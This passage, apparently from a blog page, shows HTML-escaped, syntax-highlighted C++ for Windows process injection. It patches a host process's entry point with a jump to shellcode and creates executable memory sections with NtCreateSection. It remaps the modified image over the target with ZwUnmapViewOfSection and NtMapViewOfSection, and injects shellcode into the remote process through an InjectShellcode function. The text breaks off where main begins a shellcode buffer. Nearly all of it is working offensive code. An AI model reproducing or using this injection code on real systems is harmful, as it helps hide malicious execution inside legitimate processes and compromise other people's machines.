&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!]Original entry point : 0x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;hex &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; entryPoint &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    memset(processImage &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; entryPoint, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DWORD processEntry &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; entryPoint;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DWORD relativeAddr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (((DWORD)shellcodeAddress &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; processEntry) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)processImage &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; entryPoint) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xe9&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// jmp
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(uintptr_t&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((uintptr_t)processImage &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; entryPoint &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; relativeAddr; &lt;span style=&#34;color:#75715e&#34;&gt;// address
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    LARGE_INTEGER sectionSize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { sizeOfImage };
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    HANDLE sectionHandle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    PVOID sectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtCreateSection(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionHandle, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        SECTION_ALL_ACCESS, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        NULL, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (PLARGE_INTEGER)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionSize, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        PAGE_EXECUTE_READWRITE,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        SEC_COMMIT, NULL) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] create section failed&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtMapViewOfSection(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        sectionHandle, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        GetCurrentProcess(), 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionAddress, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        NULL, NULL, NULL, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bytesRead, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, NULL, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        PAGE_EXECUTE_READWRITE) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] create section failed&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!]replacing patched process image at 0x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;hex &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    memcpy(sectionAddress, processImage, sizeOfImage);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    sectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (PVOID)hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fZwUnmapViewOfSection(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        sectionAddress) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] unmapping failed&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtMapViewOfSection(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        sectionHandle, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionAddress, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        NULL, NULL, NULL,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bytesRead, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, NULL, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        PAGE_EXECUTE_READWRITE) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;create section failed&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    CloseHandle(sectionHandle);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;delete&lt;/span&gt;[] processImage;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (PVOID)processEntry;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PVOID &lt;span style=&#34;color:#a6e22e&#34;&gt;InjectShellcode&lt;/span&gt;(HOST&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; hostProcess, SHELLCODE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; s)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    LARGE_INTEGER sectionSize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcodeSize };
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    HANDLE sectionHandle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    PVOID localSectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL, remoteSectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// create a read write execute memory region in the local process
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtCreateSection(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionHandle, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        SECTION_MAP_READ &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; SECTION_MAP_WRITE &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; SECTION_MAP_EXECUTE, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        NULL,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (PLARGE_INTEGER)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionSize, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        PAGE_EXECUTE_READWRITE, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        SEC_COMMIT, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        NULL) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Create section failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// create a view of the memory section in the local process
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtMapViewOfSection(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        sectionHandle, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        GetCurrentProcess(), 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;localSectionAddress, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        NULL, NULL, NULL,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcodeSize, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, NULL, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        PAGE_READWRITE) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Create map failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// create a map view of the section in the target process
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtMapViewOfSection(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        sectionHandle, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;remoteSectionAddress, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        NULL, NULL, NULL,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcodeSize, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, NULL, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        PAGE_EXECUTE_READ) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Create map failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    memcpy(localSectionAddress, s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcode, s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcodeSize);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!]Shellcode injected to 0x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;hex &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; (DWORD)remoteSectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    CloseHandle(sectionHandle);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; remoteSectionAddress;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 
